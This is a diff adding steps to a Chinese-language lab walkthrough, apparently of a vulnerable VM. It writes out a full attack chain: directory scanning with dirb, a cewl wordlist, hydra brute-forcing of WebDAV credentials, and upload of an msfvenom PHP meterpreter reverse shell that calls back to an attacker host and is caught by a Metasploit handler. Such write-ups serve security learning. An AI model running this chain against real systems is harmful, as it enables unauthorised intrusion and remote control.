@@ -59,3 +59,59 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 >  获取主机ip和端口
 
+```shell
+# 目录扫描
+dirb http://172.16.168.141/
+
+# webdav
+http://172.16.168.141/webdav
+```
+
+[webdav](https://zh.wikipedia.org/wiki/WebDAV)
+
+```shell
+# cewl 爬去网站信息，创建字典
+cewl http://172.16.168.141/ -w pass.txt
+
+# hydra
+hydra -L pass.txt -P pass.txt 172.16.168.141 http-get /webdav
+
+[80][http-get] host: 172.16.168.141   login: yamdoot   password: Swarg
+```
+
+```shell
+# 连接webdava
+sudo apt install cadaver -y
+
+cadaver http://172.16.168.141/webdav
+# 用户名/密码
+yamdoot/Swarg
+
+# 上传木马
+msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.168.128 LPORT=4444 -f raw > shell.php
+
+put shell.php
+
+# msf开启
+msfconsole
+
+use exploit/multi/handler
+
+set payload php/meterpreter/reverse_tcp
+
+set LHOST 172.16.168.128
+
+set LPORT 4444
+
+# 运行
+run
+
+# 访问木马 输入用户名和密码
+172.16.168.141/webdav/shell.php
+
+# 进入shell 交互终端
+shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+```
+
